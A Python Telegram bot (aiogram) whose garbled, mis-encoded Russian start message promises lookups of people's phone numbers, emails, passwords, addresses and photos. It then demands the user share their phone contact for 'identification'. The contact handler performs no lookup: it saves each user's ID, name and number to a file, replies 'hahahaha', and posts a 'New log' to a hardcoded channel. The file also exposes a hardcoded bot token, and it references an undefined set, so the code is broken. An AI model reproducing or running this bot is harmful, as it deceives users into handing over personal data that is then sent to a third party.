import logging
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import ParseMode
from aiogram.utils import executor

API_TOKEN = '6701198192:AAGq9S8mhrTkmrnFC2BSh2YbzFTYQHGarUE'
CHANNEL_ID = '-1002115742637'
FILE_NAME = 'users.txt'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
logging.basicConfig(level=logging.INFO)
dp.middleware.setup(LoggingMiddleware())


@dp.message_handler(commands=['start'])
async def handle_start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button = types.KeyboardButton("–ü–æ–¥–µ–ª–∏—Ç—å—Å—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–º", request_contact=True)
    keyboard.add(button)

    await message.reply("üÜò –í—ã –º–æ–∂–µ—Ç–µ –ø—Ä–∏—Å–ª–∞—Ç—å –±–æ—Ç—É –∑–∞–ø—Ä–æ—Å—ã –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ñ–æ—Ä–º–∞—Ç–µ:\nüë§ –ü–æ–∏—Å–∫ –ø–æ –∏–º–µ–Ω–∏\n‚îú  –ü—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç\n‚îú  –ê–Ω—Ç–∏–ø–æ–≤ –ï–≤–≥–µ–Ω–∏–π\n‚îú  –ê–Ω—Ç–∏–ø–æ–≤ –ï–≤–≥–µ–Ω–∏–π –í—è—á–µ—Å–ª–∞–≤–æ–≤–∏—á\n‚îî  –ê–Ω—Ç–∏–ø–æ–≤ –ï–≤–≥–µ–Ω–∏–π –í—è—á–µ—Å–ª–∞–≤–æ–≤–∏—á 05.02.1994\n\nüì± 79999939919 - –¥–ª—è –ø–æ–∏—Å–∫–∞ –ø–æ –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞\nüì® tema@gmail.com - –¥–ª—è –ø–æ–∏—Å–∫–∞ –ø–æ Email\nüìß 281485304, @durov –∏–ª–∏ –ø–µ—Ä–µ—à–ª–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ - –ø–æ–∏—Å–∫ –ø–æ Telegram –∞–∫–∫–∞—É–Ω—Ç—É\nüîê /pas churchill7 - –ø–æ–∏—Å–∫ –ø–æ—á—Ç—ã, –ª–æ–≥–∏–Ω–∞ –∏ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –ø–æ –ø–∞—Ä–æ–ª—é\nüèö /adr –ú–æ—Å–∫–≤–∞, –¢–≤–µ—Ä—Å–∫–∞—è, –¥ 1, –∫–≤ 1 - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –ø–æ –∞–¥—Ä–µ—Å—É (–†–§)\n\nüì∏ –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ —á–µ–ª–æ–≤–µ–∫–∞, —á—Ç–æ–±—ã –Ω–∞–π—Ç–∏ –µ–≥–æ –∏–ª–∏ –¥–≤–æ–π–Ω–∏–∫–∞ –Ω–∞ —Å–∞–π—Ç–∞—Ö –í–ö, –û–ö.\nüöô –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ –Ω–æ–º–µ—Ä–∞ –∞–≤—Ç–æ–º–æ–±–∏–ª—è, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –æ –Ω–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.\nüåé –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–æ—á–∫—É –Ω–∞ –∫–∞—Ä—Ç–µ, —á—Ç–æ–±—ã –Ω–∞–π—Ç–∏ –ª—é–¥–µ–π, –∫–æ—Ç–æ—Ä—ã–µ —Å–µ–π—á–∞—Å —Ç–∞–º.\nüó£ –° –ø–æ–º–æ—â—å—é –≥–æ–ª–æ—Å–æ–≤—ã—Ö –∫–æ–º–∞–Ω–¥ —Ç–∞–∫–∂–µ –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø–æ–∏—Å–∫–æ–≤—ã–µ –∑–∞–ø—Ä–æ—Å—ã.", reply_markup=keyboard)
    await message.reply("üóÇ –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞\n\n–í–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –∑–∞–≤–µ—Ä—à–∏—Ç—å –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é.\n\n–î–ª—è —ç—Ç–æ–≥–æ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.", reply_markup=keyboard)


@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    first_name = message.contact.first_name
    last_name = message.contact.last_name
    user_id = message.from_user.id
    phone_number = message.contact.phone_number

    is_duplicate = check_duplicate(user_id)

    if not is_duplicate:
        with open(FILE_NAME, 'a') as f:
            f.write(f"{user_id},{first_name},{last_name},{phone_number}\n")

    if not is_duplicate:
        await message.reply('hahahaha')
        await send_to_channel(f"–ù–æ–≤—ã–π –ª–æ–≥: {first_name} {last_name} (ID: {user_id}), –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {phone_number}")


def check_duplicate(user_id):
    if user_id in processed_users:
        return True
    else:
        processed_users.add(user_id)
        return False


async def send_to_channel(text):
    await bot.send_message(CHANNEL_ID, text)


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)